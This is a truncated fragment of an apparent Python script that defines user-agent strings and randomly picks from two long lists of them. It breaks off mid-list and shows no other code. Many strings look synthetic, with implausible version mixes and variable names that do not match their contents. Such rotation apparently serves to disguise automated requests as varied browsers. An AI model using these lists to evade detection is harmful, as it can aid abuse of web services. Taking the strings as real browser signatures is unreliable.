uas_j7prime = "Mozilla/5.0 (iPhone; CPU iPhone OS 7_3_1; like Mac OS X) AppleWebKit/533.24 (KHTML, like Gecko)  Chrome/51.0.3558.200 Mobile Safari/534.9"
uas_tes = "Mozilla/5.0 (Windows; Windows NT 10.0; Win64; x64) AppleWebKit/602.25 (KHTML, like Gecko) Chrome/54.0.1186.130 Safari/601.8 Edge/8.30344"
uas_random = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_0; like Mac OS X) AppleWebKit/602.37 (KHTML, like Gecko)  Chrome/54.0.2727.257 Mobile Safari/533.9','Mozilla/5.0 (Linux; U; Android 5.1.1; MOTOROLA MOTO X FORCE XT1580 Build/LXB22) AppleWebKit/601.40 (KHTML, like Gecko)  Chrome/52.0.1049.262 Mobile Safari/601.8','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_2_3) AppleWebKit/535.48 (KHTML, like Gecko) Chrome/55.0.2168.117 Safari/602','Mozilla/5.0 (Windows NT 6.1;; en-US) AppleWebKit/534.11 (KHTML, like Gecko) Chrome/50.0.1863.150 Safari/536','Mozilla/5.0 (Linux; U; Android 5.1.1; Nexus 8 Build/LMY48B) AppleWebKit/602.39 (KHTML, like Gecko)  Chrome/54.0.2626.203 Mobile Safari/536.9','Mozilla/5.0 (Linux; U; Android 4.3.1; HTC Xplorer A320e Build/GRJ90) AppleWebKit/535.39 (KHTML, like Gecko)  Chrome/52.0.2970.374 Mobile Safari/533.3','Mozilla/5.0 (Android; Android 4.4.1; LG-H200 Build/KOT49I) AppleWebKit/534.45 (KHTML, like Gecko)  Chrome/50.0.1511.174 Mobile Safari/535.6','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_2; en-US) Gecko/20130401 Firefox/68.6','Mozilla/5.0 (Linux; Linux x86_64) Gecko/20130401 Firefox/49.5','Mozilla/5.0 (Windows NT 10.5; Win64; x64; en-US) AppleWebKit/537.46 (KHTML, like Gecko) Chrome/50.0.1871.182 Safari/536.0 Edge/14.57127','Mozilla/5.0 (iPhone; CPU iPhone OS 10_6_3; like Mac OS X) AppleWebKit/602.22 (KHTML, like Gecko)  Chrome/48.0.3043.277 Mobile Safari/534.1','Mozilla/5.0 (Windows NT 10.4; Win64; x64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/47.0.3258.135 Safari/602.2 Edge/15.43142','Mozilla/5.0 (U; Linux i642 x86_64) AppleWebKit/536.10 (KHTML, like Gecko) Chrome/52.0.2531.147 Safari/600','Mozilla/5.0 (Android; Android 5.1; SM-G9350F-ORANGE Build/LMY47X) AppleWebKit/534.14 (KHTML, like Gecko)  Chrome/54.0.3446.122 Mobile Safari/534.6','Mozilla/5.0 (iPhone; CPU iPhone OS 10_9_4; like Mac OS X) AppleWebKit/603.37 (KHTML, like Gecko)  Chrome/47.0.2336.194 Mobile Safari/600.5','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_3_4; en-US) Gecko/20100101 Firefox/69.0','Mozilla/5.0 (Windows; Windows NT 6.1; x64; en-US) AppleWebKit/603.43 (KHTML, like Gecko) Chrome/53.0.2802.148 Safari/603.0 Edge/10.23012','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_2_8) Gecko/20130401 Firefox/48.9','Mozilla/5.0 (Linux; Android 5.0.2; LG-D724 Build/LRX22G) AppleWebKit/533.46 (KHTML, like Gecko)  Chrome/47.0.1582.263 Mobile Safari/537.3','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_7; en-US) Gecko/20100101 Firefox/68.0','Mozilla/5.0 (Linux; Linux x86_64) AppleWebKit/600.18 (KHTML, like Gecko) Chrome/53.0.1995.220 Safari/533','Mozilla/5.0 (Linux; U; Linux x86_64) Gecko/20100101 Firefox/51.7','Mozilla/5.0 (Windows; Windows NT 10.0; WOW64) AppleWebKit/602.45 (KHTML, like Gecko) Chrome/54.0.2270.374 Safari/602.5 Edge/8.45605','Mozilla/5.0 (iPhone; CPU iPhone OS 11_5_9; like Mac OS X) AppleWebKit/602.21 (KHTML, like Gecko)  Chrome/49.0.1202.250 Mobile Safari/533.2','Mozilla/5.0 (iPod; CPU iPod OS 10_8_4; like Mac OS X) AppleWebKit/534.8 (KHTML, like Gecko)  Chrome/55.0.2809.301 Mobile Safari/536.4','Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2; like Mac OS X) AppleWebKit/601.13 (KHTML, like Gecko)  Chrome/51.0.2709.104 Mobile Safari/535.9','Mozilla/5.0 (U; Linux i663 x86_64; en-US) Gecko/20130401 Firefox/50.6','Mozilla/5.0 (Linux; Android 5.0.1; LG-D330 Build/LRX22G) AppleWebKit/600.12 (KHTML, like Gecko)  Chrome/53.0.3408.127 Mobile Safari/601.6','Mozilla/5.0 (Linux; Android 5.0.1; HTC Butterfly S 919s Build/LRX22G) AppleWebKit/537.4 (KHTML, like Gecko)  Chrome/50.0.1711.174 Mobile Safari/603.6','Mozilla/5.0 (iPhone; CPU iPhone OS 7_4_9; like Mac OS X) AppleWebKit/602.35 (KHTML, like Gecko)  Chrome/48.0.3588.192 Mobile Safari/537.2','Mozilla/5.0 (compatible; MSIE 11.0; Windows; Windows NT 6.3; WOW64 Trident/7.0)','Mozilla/5.0 (iPad; CPU iPad OS 7_3_8 like Mac OS X) AppleWebKit/601.33 (KHTML, like Gecko)  Chrome/47.0.2483.147 Mobile Safari/535.1','Mozilla/5.0 (Android; Android 6.0; HTC One0P8B2 Build/MRA58K) AppleWebKit/533.49 (KHTML, like Gecko)  Chrome/52.0.2274.400 Mobile Safari/600.7','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_12_1) Gecko/20100101 Firefox/64.0','Mozilla/5.0 (Windows NT 6.2; Win64; x64) Gecko/20100101 Firefox/65.1','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_9_7; en-US) AppleWebKit/601.12 (KHTML, like Gecko) Chrome/49.0.2051.332 Safari/535','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_5; en-US) Gecko/20100101 Firefox/69.5','Mozilla/5.0 (Windows; U; Windows NT 10.5; WOW64; en-US) Gecko/20130401 Firefox/54.1','Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_7; like Mac OS X) AppleWebKit/601.14 (KHTML, like Gecko)  Chrome/48.0.1047.158 Mobile Safari/600.0','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_0_9) AppleWebKit/533.43 (KHTML, like Gecko) Chrome/47.0.3801.365 Safari/600','Mozilla/5.0 (Windows; Windows NT 6.1; x64) Gecko/20130401 Firefox/60.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_5) Gecko/20100101 Firefox/60.3','Mozilla/5.0 (Windows; Windows NT 6.2; Win64; x64) Gecko/20130401 Firefox/59.5','Mozilla/5.0 (iPod; CPU iPod OS 9_0_1; like Mac OS X) AppleWebKit/600.28 (KHTML, like Gecko)  Chrome/49.0.3683.119 Mobile Safari/603.6','Mozilla/5.0 (Windows; Windows NT 10.1; Win64; x64) Gecko/20100101 Firefox/73.2','Mozilla/5.0 (iPod; CPU iPod OS 10_6_8; like Mac OS X) AppleWebKit/534.18 (KHTML, like Gecko)  Chrome/55.0.3842.336 Mobile Safari/533.2','Mozilla/5.0 (Windows; Windows NT 6.3; x64; en-US) AppleWebKit/535.22 (KHTML, like Gecko) Chrome/51.0.2990.355 Safari/536','Mozilla/5.0 (Windows NT 10.1; x64; en-US) AppleWebKit/603.43 (KHTML, like Gecko) Chrome/47.0.2641.182 Safari/603.2 Edge/8.67172','Mozilla/5.0 (iPhone; CPU iPhone OS 10_8_1; like Mac OS X) AppleWebKit/535.31 (KHTML, like Gecko)  Chrome/47.0.2461.124 Mobile Safari/537.7','Mozilla/5.0 (Windows; Windows NT 6.2;; en-US) AppleWebKit/602.7 (KHTML, like Gecko) Chrome/47.0.1060.389 Safari/537','Mozilla/5.0 (Windows; Windows NT 10.0; WOW64) AppleWebKit/533.30 (KHTML, like Gecko) Chrome/53.0.3162.145 Safari/534.7 Edge/18.93071','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_0_1; en-US) Gecko/20100101 Firefox/50.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 7_1_3; en-US) AppleWebKit/535.15 (KHTML, like Gecko) Chrome/54.0.3991.310 Safari/533','Mozilla/5.0 (iPhone; CPU iPhone OS 11_5_2; like Mac OS X) AppleWebKit/533.17 (KHTML, like Gecko)  Chrome/48.0.3644.211 Mobile Safari/603.5','Mozilla/5.0 (Linux; Android 4.3.1; Samsung Galaxy SIV Mega GT-I9200 Build/JDQ39) AppleWebKit/603.25 (KHTML, like Gecko)  Chrome/53.0.2970.119 Mobile Safari/534.3','Mozilla/5.0 (Android; Android 7.1; SAMSUNG GT-I9400 Build/KTU84P) AppleWebKit/600.26 (KHTML, like Gecko)  Chrome/48.0.1208.199 Mobile Safari/535.4','Mozilla/5.0 (iPhone; CPU iPhone OS 8_5_8; like Mac OS X) AppleWebKit/536.16 (KHTML, like Gecko)  Chrome/54.0.2880.250 Mobile Safari/603.6','Mozilla/5.0 (Windows; U; Windows NT 10.4; WOW64; en-US) AppleWebKit/602.12 (KHTML, like Gecko) Chrome/48.0.3552.310 Safari/603.4 Edge/8.15678','Mozilla/5.0 (Linux i566 ) AppleWebKit/603.23 (KHTML, like Gecko) Chrome/50.0.2706.343 Safari/536','Mozilla/5.0 (Windows; U; Windows NT 6.3;; en-US) AppleWebKit/537.45 (KHTML, like Gecko) Chrome/47.0.1500.381 Safari/603','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_8; en-US) AppleWebKit/600.6 (KHTML, like Gecko) Chrome/53.0.3343.174 Safari/537','Mozilla/5.0 (U; Linux x86_64; en-US) Gecko/20130401 Firefox/57.5','Mozilla/5.0 (Windows; U; Windows NT 10.1;; en-US) Gecko/20100101 Firefox/51.2','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_4; en-US) Gecko/20100101 Firefox/68.8','Mozilla/5.0 (Linux; U; Linux i656 ) AppleWebKit/537.12 (KHTML, like Gecko) Chrome/54.0.1238.376 Safari/600','Mozilla/5.0 (compatible; MSIE 9.0; Windows; U; Windows NT 6.1; x64; en-US Trident/5.0)','Mozilla/5.0 (iPhone; CPU iPhone OS 9_1_9; like Mac OS X) AppleWebKit/537.43 (KHTML, like Gecko)  Chrome/50.0.3088.253 Mobile Safari/534.4','Mozilla/5.0 (Linux; Android 5.0.1; Nokia 1100 4G Build/GRK39F) AppleWebKit/602.35 (KHTML, like Gecko)  Chrome/53.0.2918.318 Mobile Safari/603.3','Mozilla/5.0 (iPad; CPU iPad OS 7_7_7 like Mac OS X) AppleWebKit/535.26 (KHTML, like Gecko)  Chrome/51.0.3352.102 Mobile Safari/536.9','Mozilla/5.0 (Linux; U; Linux i554 ) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/49.0.1218.191 Safari/603','Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_5; like Mac OS X) AppleWebKit/600.27 (KHTML, like Gecko)  Chrome/51.0.3476.351 Mobile Safari/535.2','Mozilla/5.0 (Linux; U; Android 4.4.4; [HM NOTE|NOTE-III|NOTE2 1LTET) AppleWebKit/602.38 (KHTML, like Gecko)  Chrome/55.0.1734.289 Mobile Safari/601.8','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_1_9) Gecko/20100101 Firefox/59.4','Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_2; like Mac OS X) AppleWebKit/536.24 (KHTML, like Gecko)  Chrome/51.0.3211.204 Mobile Safari/601.0','Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; x64 Trident/4.0)','Mozilla/5.0 (iPad; CPU iPad OS 9_0_5 like Mac OS X) AppleWebKit/601.10 (KHTML, like Gecko)  Chrome/53.0.2875.126 Mobile Safari/600.5','Mozilla/5.0 (U; Linux i645 x86_64) Gecko/20100101 Firefox/67.0','Mozilla/5.0 (compatible; MSIE 11.0; Windows; Windows NT 6.2; Win64; x64; en-US Trident/7.0)','Mozilla/5.0 (Windows NT 10.2; x64) AppleWebKit/534.8 (KHTML, like Gecko) Chrome/49.0.1247.390 Safari/537.2 Edge/18.27776','Mozilla/5.0 (iPhone; CPU iPhone OS 9_9_7; like Mac OS X) AppleWebKit/534.35 (KHTML, like Gecko)  Chrome/47.0.1039.218 Mobile Safari/600.1','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_9_0; en-US) AppleWebKit/533.13 (KHTML, like Gecko) Chrome/49.0.3460.256 Safari/533','Mozilla/5.0 (Linux; U; Android 6.0; Nexus 7 Build/MDB08L) AppleWebKit/602.31 (KHTML, like Gecko)  Chrome/55.0.1432.268 Mobile Safari/603.7','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_3; like Mac OS X) AppleWebKit/600.23 (KHTML, like Gecko)  Chrome/49.0.1223.306 Mobile Safari/533.8','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_0) AppleWebKit/600.19 (KHTML, like Gecko) Chrome/47.0.1895.142 Safari/603','Mozilla/5.0 (Macintosh; Intel Mac OS X 8_4_0; en-US) Gecko/20100101 Firefox/50.4','Mozilla/5.0 (U; Linux i571 ; en-US) Gecko/20100101 Firefox/57.0','Mozilla/5.0 (compatible; MSIE 11.0; Windows; U; Windows NT 6.3; Win64; x64 Trident/7.0)','Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_0; like Mac OS X) AppleWebKit/533.45 (KHTML, like Gecko)  Chrome/52.0.1511.161 Mobile Safari/601.9','Mozilla/5.0 (Macintosh; Intel Mac OS X 7_9_7; en-US) Gecko/20100101 Firefox/71.1','Mozilla/5.0 (Windows; Windows NT 10.1; x64; en-US) AppleWebKit/603.39 (KHTML, like Gecko) Chrome/55.0.1953.116 Safari/533.7 Edge/13.65730','Mozilla/5.0 (Linux; U; Linux x86_64) Gecko/20100101 Firefox/52.7','Mozilla/5.0 (Windows NT 6.1; x64; en-US) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/48.0.3160.106 Safari/534','Mozilla/5.0 (Linux; Linux i686 x86_64; en-US) AppleWebKit/535.26 (KHTML, like Gecko) Chrome/48.0.2840.273 Safari/600','Mozilla/5.0 (U; Linux i643 x86_64; en-US) Gecko/20100101 Firefox/45.8','Mozilla/5.0 (compatible; MSIE 7.0; Windows; Windows NT 6.0; Win64; x64; en-US Trident/4.0)','Mozilla/5.0 (Android; Android 5.1.1; Nexus 7 Build/LMY48B) AppleWebKit/600.6 (KHTML, like Gecko)  Chrome/52.0.3097.277 Mobile Safari/533.4','Mozilla/5.0 (Windows NT 6.3;) AppleWebKit/603.7 (KHTML, like Gecko) Chrome/52.0.2841.365 Safari/601','Mozilla/5.0 (compatible; MSIE 11.0; Windows; U; Windows NT 6.3; x64 Trident/7.0)','Mozilla/5.0 (compatible; MSIE 7.0; Windows; U; Windows NT 6.1; Trident/4.0)','Mozilla/5.0 (iPhone; CPU iPhone OS 10_7_9; like Mac OS X) AppleWebKit/533.9 (KHTML, like Gecko)  Chrome/49.0.1476.397 Mobile Safari/601.6','Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_9; like Mac OS X) AppleWebKit/600.49 (KHTML, like Gecko)  Chrome/51.0.1059.276 Mobile Safari/602.5','Mozilla/5.0 (U; Linux x86_64) AppleWebKit/602.17 (KHTML, like Gecko) Chrome/52.0.2631.105 Safari/536','Mozilla/5.0 (Linux x86_64; en-US) Gecko/20100101 Firefox/73.5','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2; like Mac OS X) AppleWebKit/602.49 (KHTML, like Gecko)  Chrome/51.0.1155.122 Mobile Safari/601.7','Mozilla/5.0 (Linux; U; Linux x86_64; en-US) Gecko/20130401 Firefox/49.3','Mozilla/5.0 (iPhone; CPU iPhone OS 9_0_0; like Mac OS X) AppleWebKit/603.50 (KHTML, like Gecko)  Chrome/52.0.1983.117 Mobile Safari/534.2','Mozilla/5.0 (Linux x86_64) AppleWebKit/603.41 (KHTML, like Gecko) Chrome/47.0.3222.333 Safari/535','Mozilla/5.0 (Android; Android 6.0; HTC One M8 Pro Build/MRA58K) AppleWebKit/602.21 (KHTML, like Gecko)  Chrome/55.0.3817.180 Mobile Safari/600.7','Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_7; like Mac OS X) AppleWebKit/600.7 (KHTML, like Gecko)  Chrome/48.0.1093.330 Mobile Safari/536.2','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_9_3; en-US) Gecko/20100101 Firefox/45.9','Mozilla/5.0 (Macintosh; Intel Mac OS X 8_9_5; en-US) AppleWebKit/535.26 (KHTML, like Gecko) Chrome/53.0.2071.389 Safari/535','Mozilla/5.0 (Windows; U; Windows NT 10.1;) AppleWebKit/602.17 (KHTML, like Gecko) Chrome/47.0.3536.152 Safari/534','Mozilla/5.0 (iPhone; CPU iPhone OS 9_1_3; like Mac OS X) AppleWebKit/537.20 (KHTML, like Gecko)  Chrome/51.0.3603.226 Mobile Safari/534.1','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_9_2; en-US) Gecko/20130401 Firefox/65.3','Mozilla/5.0 (Linux; U; Android 7.0; Pixel XL Build/NRD90M) AppleWebKit/600.3 (KHTML, like Gecko)  Chrome/52.0.2262.274 Mobile Safari/603.9','Mozilla/5.0 (Windows; Windows NT 6.2; x64; en-US) AppleWebKit/601.5 (KHTML, like Gecko) Chrome/50.0.3877.132 Safari/601','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1; en-US) AppleWebKit/600.15 (KHTML, like Gecko) Chrome/51.0.1440.357 Safari/533','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_9_3; en-US) Gecko/20100101 Firefox/54.2','Mozilla/5.0 (U; Linux x86_64) Gecko/20100101 Firefox/58.9','Mozilla/5.0 (Windows; Windows NT 6.2; Win64; x64; en-US) Gecko/20100101 Firefox/51.0','Mozilla/5.0 (compatible; MSIE 10.0; Windows; U; Windows NT 6.3; x64 Trident/6.0)','Mozilla/5.0 (Windows; Windows NT 10.5; x64; en-US) AppleWebKit/537.8 (KHTML, like Gecko) Chrome/54.0.3863.349 Safari/535.4 Edge/10.38876','Mozilla/5.0 (iPhone; CPU iPhone OS 11_6_6; like Mac OS X) AppleWebKit/533.34 (KHTML, like Gecko)  Chrome/47.0.2920.388 Mobile Safari/603.6','Mozilla/5.0 (Linux x86_64; en-US) AppleWebKit/602.26 (KHTML, like Gecko) Chrome/53.0.1581.297 Safari/533','Mozilla/5.0 (Windows; Windows NT 6.0;; en-US) AppleWebKit/602.33 (KHTML, like Gecko) Chrome/48.0.1817.364 Safari/602','Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/536.35 (KHTML, like Gecko) Chrome/47.0.1057.122 Safari/533','Mozilla/5.0 (compatible; MSIE 9.0; Windows; U; Windows NT 6.2; x64 Trident/5.0)','Mozilla/5.0 (Linux; Linux i580 x86_64; en-US) Gecko/20100101 Firefox/45.7','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_7_3) AppleWebKit/537.32 (KHTML, like Gecko) Chrome/54.0.2428.311 Safari/602','Mozilla/5.0 (Linux x86_64; en-US) Gecko/20100101 Firefox/48.0','Mozilla/5.0 (U; Linux i653 ; en-US) AppleWebKit/603.4 (KHTML, like Gecko) Chrome/47.0.2460.191 Safari/534','Mozilla/5.0 (Windows; U; Windows NT 10.3; Win64; x64; en-US) AppleWebKit/603.27 (KHTML, like Gecko) Chrome/53.0.3873.399 Safari/536.9 Edge/10.67321','Mozilla/5.0 (Windows; U; Windows NT 6.3;; en-US) AppleWebKit/601.49 (KHTML, like Gecko) Chrome/48.0.3606.105 Safari/601.5 Edge/8.73904','Mozilla/5.0 (U; Linux x86_64) Gecko/20130401 Firefox/68.1','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_5; en-US) AppleWebKit/602.42 (KHTML, like Gecko) Chrome/49.0.3781.101 Safari/534','Mozilla/5.0 (Windows NT 10.5;; en-US) Gecko/20100101 Firefox/54.2','Mozilla/5.0 (U; Linux i563 x86_64) AppleWebKit/533.12 (KHTML, like Gecko) Chrome/52.0.3155.298 Safari/537','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_2_1; en-US) Gecko/20130401 Firefox/50.8','Mozilla/5.0 (Linux; Android 5.1; Nexus 5 Build/LRX22C) AppleWebKit/600.14 (KHTML, like Gecko)  Chrome/50.0.1904.363 Mobile Safari/600.5','Mozilla/5.0 (Macintosh; Intel Mac OS X 7_0_3; en-US) AppleWebKit/601.38 (KHTML, like Gecko) Chrome/50.0.3156.378 Safari/602','Mozilla/5.0 (Windows NT 10.2; WOW64) AppleWebKit/602.41 (KHTML, like Gecko) Chrome/52.0.2665.382 Safari/600.7 Edge/13.87860','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.0; WOW64; en-US Trident/6.0)','Mozilla/5.0 (Android; Android 6.0.1; HTC One_M8 Build/MRA58K) AppleWebKit/536.48 (KHTML, like Gecko)  Chrome/51.0.3650.333 Mobile Safari/536.4','Mozilla/5.0 (Macintosh; Intel Mac OS X 7_6_4) AppleWebKit/600.41 (KHTML, like Gecko) Chrome/52.0.3288.258 Safari/600','Mozilla/5.0 (Linux; U; Linux i675 ) Gecko/20100101 Firefox/74.2','Mozilla/5.0 (Linux; Android 5.1; SAMSUNG SM-G935FQ Build/LMY47X) AppleWebKit/602.24 (KHTML, like Gecko)  Chrome/53.0.2054.206 Mobile Safari/601.4','Mozilla/5.0 (iPhone; CPU iPhone OS 10_7_8; like Mac OS X) AppleWebKit/534.36 (KHTML, like Gecko)  Chrome/53.0.1233.385 Mobile Safari/601.4','Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.3; x64; en-US Trident/5.0)','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_8; en-US) Gecko/20100101 Firefox/68.9','Mozilla/5.0 (Windows; Windows NT 10.0; x64; en-US) AppleWebKit/536.44 (KHTML, like Gecko) Chrome/55.0.1064.102 Safari/603.5 Edge/12.47551'])
uas_nokiac3 = "Mozilla/5.0 (Linux; Linux i563 ; en-US) AppleWebKit/536.16 (KHTML, like Gecko) Chrome/51.0.2460.244 Safari/601"
uas_iphone = "Mozilla/5.0 (Macintosh; Intel Mac OS X 7_8_5; en-US) Gecko/20130401 Firefox/74.1 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
uas_nokia5plus = "Mozilla/5.0 (Macintosh; Intel Mac OS X 7_1_7; en-US) Gecko/20100101 Firefox/70.8"
uas_random2 = random.choice(['Mozilla/5.0 (Linux; U; Linux i651 x86_64; en-US) Gecko/20100101 Firefox/55.7','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_4_2; en-US) Gecko/20100101 Firefox/48.2','Mozilla/5.0 (Windows; Windows NT 10.4;) AppleWebKit/534.45 (KHTML, like Gecko) Chrome/53.0.2185.241 Safari/537.2 Edge/18.38342','Mozilla/5.0 (Windows NT 10.2; x64) Gecko/20100101 Firefox/57.1','Mozilla/5.0 (iPhone; CPU iPhone OS 9_8_4; like Mac OS X) AppleWebKit/601.13 (KHTML, like Gecko)  Chrome/48.0.3299.215 Mobile Safari/603.1','Mozilla/5.0 (compatible; MSIE 9.0; Windows; U; Windows NT 6.2; WOW64; en-US Trident/5.0)','Mozilla/5.0 (iPod; CPU iPod OS 10_2_2; like Mac OS X) AppleWebKit/601.32 (KHTML, like Gecko)  Chrome/53.0.2427.248 Mobile Safari/601.2','Mozilla/5.0 (Linux; Linux i586 x86_64; en-US) AppleWebKit/602.16 (KHTML, like Gecko) Chrome/48.0.3987.335 Safari/537','Mozilla/5.0 (Linux; U; Android 4.4.4; SM-J200F Build/KTU84P) AppleWebKit/601.6 (KHTML, like Gecko)  Chrome/50.0.1572.395 Mobile Safari/601.5','Mozilla/5.0 (iPhone; CPU iPhone OS 8_8_3; like Mac OS X) AppleWebKit/535.7 (KHTML, like Gecko)  Chrome/55.0.2850.342 Mobile Safari/536.8','Mozilla/5.0 (Windows; Windows NT 10.0; WOW64) AppleWebKit/534.40 (KHTML, like Gecko) Chrome/48.0.2948.290 Safari/533','Mozilla/5.0 (Windows NT 10.4;; en-US) AppleWebKit/535.38 (KHTML, like Gecko) Chrome/52.0.3332.265 Safari/533.1 Edge/17.22303','Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3;; en-US Trident/4.0)','Mozilla/5.0 (U; Linux i655 ; en-US) Gecko/20100101 Firefox/55.8','Mozilla/5.0 (compatible; MSIE 11.0; Windows; U; Windows NT 6.1; x64 Trident/7.0)','Mozilla/5.0 (Windows NT 10.3; Win64; x64; en-US) AppleWebKit/536.43 (KHTML, like Gecko) Chrome/50.0.1849.151 Safari/534.0 Edge/13.74254','Mozilla/5.0 (Android; Android 5.0.1; HTC 80:number1-2e Build/JSS15J) AppleWebKit/603.49 (KHTML, like Gecko)  Chrome/50.0.1723.339 Mobile Safari/533.3','Mozilla/5.0 (U; Linux x86_64; en-US) AppleWebKit/603.28 (KHTML, like Gecko) Chrome/49.0.1213.368 Safari/602','Mozilla/5.0 (compatible; MSIE 11.0; Windows; Windows NT 6.1; Win64; x64; en-US Trident/7.0)','Mozilla/5.0 (Android; Android 7.1.1; Pixel C Build/NRD90M) AppleWebKit/534.39 (KHTML, like Gecko)  Chrome/53.0.3432.154 Mobile Safari/534.0','Mozilla/5.0 (Linux; U; Linux i556 ) Gecko/20100101 Firefox/58.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_1) Gecko/20100101 Firefox/74.6','Mozilla/5.0 (U; Linux x86_64) AppleWebKit/601.39 (KHTML, like Gecko) Chrome/50.0.1541.340 Safari/535','Mozilla/5.0 (Windows NT 6.3; Win64; x64) Gecko/20100101 Firefox/49.9','Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/47.3','Mozilla/5.0 (Linux; U; Android 4.4.1; LG-D955 Build/KOT49I) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/49.0.2296.381 Mobile Safari/534.3','Mozilla/5.0 (iPhone; CPU iPhone OS 9_0_3; like Mac OS X) AppleWebKit/603.29 (KHTML, like Gecko)  Chrome/53.0.2940.274 Mobile Safari/534.1','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Win64; x64; en-US Trident/6.0)','Mozilla/5.0 (Windows; U; Windows NT 10.0; Win64; x64) AppleWebKit/535.32 (KHTML, like Gecko) Chrome/49.0.1970.397 Safari/534.1 Edge/17.38429','Mozilla/5.0 (Windows; U; Windows NT 10.1; WOW64; en-US) AppleWebKit/600.16 (KHTML, like Gecko) Chrome/52.0.2935.286 Safari/600','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/536.2 (KHTML, like Gecko) Chrome/52.0.3630.334 Safari/603','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_6) Gecko/20130401 Firefox/68.8','Mozilla/5.0 (U; Linux i550 x86_64) Gecko/20100101 Firefox/59.3','Mozilla/5.0 (compatible; MSIE 9.0; Windows; Windows NT 6.0; WOW64 Trident/5.0)','Mozilla/5.0 (Linux; U; Android 5.1; MOTOROLA MOTO XT1570 MOTO X STYLE Build/LPD23) AppleWebKit/534.22 (KHTML, like Gecko)  Chrome/55.0.2947.222 Mobile Safari/534.3','Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; en-US Trident/5.0)','Mozilla/5.0 (Windows; U; Windows NT 6.0; Win64; x64) AppleWebKit/600.48 (KHTML, like Gecko) Chrome/49.0.2927.264 Safari/534','Mozilla/5.0 (Android; Android 5.0.2; LG-D337 Build/LRX22G) AppleWebKit/535.27 (KHTML, like Gecko)  Chrome/53.0.3026.321 Mobile Safari/537.9','Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.1; Win64; x64; en-US Trident/7.0)','Mozilla/5.0 (iPhone; CPU iPhone OS 10_7_4; like Mac OS X) AppleWebKit/600.24 (KHTML, like Gecko)  Chrome/50.0.3800.294 Mobile Safari/537.8','Mozilla/5.0 (Windows; U; Windows NT 6.0;; en-US) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/52.0.1625.244 Safari/533','Mozilla/5.0 (iPhone; CPU iPhone OS 10_9_3; like Mac OS X) AppleWebKit/535.26 (KHTML, like Gecko)  Chrome/55.0.1348.189 Mobile Safari/533.2','Mozilla/5.0 (Windows; Windows NT 6.3; Win64; x64; en-US) Gecko/20130401 Firefox/69.6','Mozilla/5.0 (Linux; U; Linux x86_64) AppleWebKit/601.18 (KHTML, like Gecko) Chrome/55.0.2112.253 Safari/533','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 9_0_6; en-US) Gecko/20100101 Firefox/48.6','Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; en-US Trident/4.0)','Mozilla/5.0 (Windows; U; Windows NT 10.4;; en-US) AppleWebKit/537.10 (KHTML, like Gecko) Chrome/50.0.1492.261 Safari/537','Mozilla/5.0 (iPhone; CPU iPhone OS 7_6_4; like Mac OS X) AppleWebKit/600.9 (KHTML, like Gecko)  Chrome/52.0.1884.274 Mobile Safari/536.4','Mozilla/5.0 (U; Linux x86_64) Gecko/20100101 Firefox/69.9','Mozilla/5.0 (Linux; U; Linux x86_64) AppleWebKit/600.39 (KHTML, like Gecko) Chrome/54.0.1884.220 Safari/536','Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.1;; en-US Trident/4.0)','Mozilla/5.0 (U; Linux i561 x86_64) Gecko/20100101 Firefox/73.5','Mozilla/5.0 (Android; Android 4.3.1; 